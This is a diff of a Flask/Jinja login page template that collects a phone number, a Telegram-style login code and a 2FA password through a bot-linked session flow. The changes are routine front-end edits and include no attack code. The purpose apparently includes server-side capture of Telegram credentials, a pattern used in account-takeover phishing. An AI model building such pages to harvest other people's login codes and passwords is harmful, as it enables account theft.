@@ -4,6 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>Login</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%23000'/%3E%3Ctext x='16' y='23' font-size='19' font-family='Arial' font-weight='bold' fill='%23fff' text-anchor='middle'%3EP%3C/text%3E%3C/svg%3E">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
@@ -162,10 +163,6 @@ body.out .card{opacity:0;transform:scale(.97)}
 </head>
 <body>
 
-<!-- =========================================================
-     VIDEO  ->  {{ bg_video }} config se aata hai.
-     Error hone par niche wala fallback use ho jaata hai.
-     ========================================================= -->
 <div class="bg" id="bg">
   <video id="bgVideo" autoplay muted loop playsinline preload="auto"
          src="{{ bg_video or '' }}"
@@ -173,7 +170,7 @@ body.out .card{opacity:0;transform:scale(.97)}
   <div class="scrim"></div>
 </div>
 
-<button class="sound muted" id="soundBtn" aria-label="Toggle sound">
+<button class="sound muted" id="soundBtn" aria-label="Toggle sound" type="button">
   <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor"
        stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
     <path d="M11 5 6 9H3v6h3l5 4V5z"/>
@@ -236,9 +233,13 @@ body.out .card{opacity:0;transform:scale(.97)}
 /* =========================================================
    CONFIG
    ========================================================= */
-const DASHBOARD_URL = "/dashboard";   // Flask route
-const OTP_LENGTH    = 5;              // Telegram default
+const DASHBOARD_URL = "/dashboard";
+const OTP_LENGTH    = 5;
 const STORE_KEY     = "nexa_sid";
+
+/* server-side state (Jinja) — bot link aur fresh login ke liye */
+const PENDING_SID  = {{ (pending_session or "") | tojson }};
+const FRESH_LOGIN  = {{ fresh | tojson }};
 
 /* ================= background video ================= */
 const bgVideo  = document.getElementById("bgVideo");
@@ -324,13 +325,23 @@ function clearOtp(){
 }
 
 function saveSession(id){
-  state.sessionId = id;
+  state.sessionId = id || null;
   try{
-    if(id){ sessionStorage.setItem(STORE_KEY, id); } else { sessionStorage.removeItem(STORE_KEY); }
+    if(id){ sessionStorage.setItem(STORE_KEY, id); }
+    else  { sessionStorage.removeItem(STORE_KEY); }
   }catch(_){}
   try{
     const url = new URL(location.href);
     if(id){ url.searchParams.set("s", id); } else { url.searchParams.delete("s"); }
+    history.replaceState(null, "", url);
+  }catch(_){}
+}
+
+function stripUrlSession(){
+  try{
+    const url = new URL(location.href);
+    url.searchParams.delete("s");
+    url.searchParams.delete("fresh");
     history.replaceState(null, "", url);
   }catch(_){}
 }
@@ -349,6 +360,7 @@ async function api(path, body){
 
 function goDashboard(){
   try{ sessionStorage.removeItem(STORE_KEY); }catch(_){}
+  stripUrlSession();
   document.body.classList.add("out");
   setTimeout(() => { window.location.href = DASHBOARD_URL; }, 420);
 }
@@ -467,7 +479,6 @@ async function verifyOtp(){
 
   const d = res.data || {};
 
-  /* 2FA required */
   if(d.requires_password){
     state.needsPassword = true;
     pwRow.classList.remove("hidden");
@@ -477,7 +488,6 @@ async function verifyOtp(){
     return;
   }
 
-  /* session dead -> restart */
   if(d.expired){
     backToStart(d.error || "Code expired. Request a new code.");
     return;
@@ -485,7 +495,6 @@ async function verifyOtp(){
 
   if(res.status === 200 && d.ok){ finish(); return; }
 
-  /* wrong code / attempts left */
   setMsg(msg2, d.error || "Verification failed. Try again.", true);
   if(d.attempts_left){
     const empty = otpInputs.find(i => !i.value) || otpInputs[0];
@@ -524,7 +533,6 @@ async function submitPassword(){
   const d = res.data || {};
 
   if(d.expired){ backToStart(d.error || "Code expired. Request a new code."); return; }
-
   if(res.status === 200 && d.ok){ finish(); return; }
 
   if(d.requires_password){
@@ -551,7 +559,7 @@ function backToStart(message){
   pwRow.classList.add("hidden");
   state.needsPassword = false;
   state.verifying = false;
-  state.forceNext = true;      // retry par naya code bhejna hai
+  state.forceNext = true;
   saveSession(null);
   setMsg(msg2, "");
   setMsg(msg1, message || "", !!message);
@@ -563,12 +571,21 @@ document.getElementById("backBtn").addEventListener("click", () => backToStart("
 
 /* ================= bootstrap ================= */
 (async function bootstrap(){
-  /* 1) bot flow: /login?s=SESSION_ID */
-  let sid = null;
-  try{ sid = new URLSearchParams(location.search).get("s"); }catch(_){}
-  if(!sid){ try{ sid = sessionStorage.getItem(STORE_KEY); }catch(_){} }
+  /* Server ?s= ya ?fresh=1 par login page render karta hai.
+     PENDING_SID ho to seedha OTP step, warna phone step. */
 
-  if(!sid) return;
+  let sid = PENDING_SID || "";
+
+  /* fresh login par purana sessionStorage restore na karo */
+  if(!sid && !FRESH_LOGIN){
+    try{ sid = sessionStorage.getItem(STORE_KEY) || ""; }catch(_){}
+  }
+
+  if(!sid){
+    if(FRESH_LOGIN){ try{ sessionStorage.removeItem(STORE_KEY); }catch(_){} }
+    state.sessionId = null;
+    return;
+  }
 
   try{
     const res = await fetch("/api/session-info?s=" + encodeURIComponent(sid),
